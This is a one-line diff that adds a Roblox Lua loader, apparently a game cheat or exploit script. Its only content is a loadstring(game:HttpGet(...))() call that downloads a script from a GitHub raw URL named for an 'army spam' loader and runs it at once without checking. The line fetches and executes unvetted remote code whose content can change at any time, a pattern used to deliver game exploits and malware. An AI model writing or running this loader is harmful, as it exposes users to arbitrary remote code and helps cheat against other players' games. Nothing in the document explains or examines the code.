@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/upd-command-an-army-spam4-8srp61o7m6fu7f.lua"))()
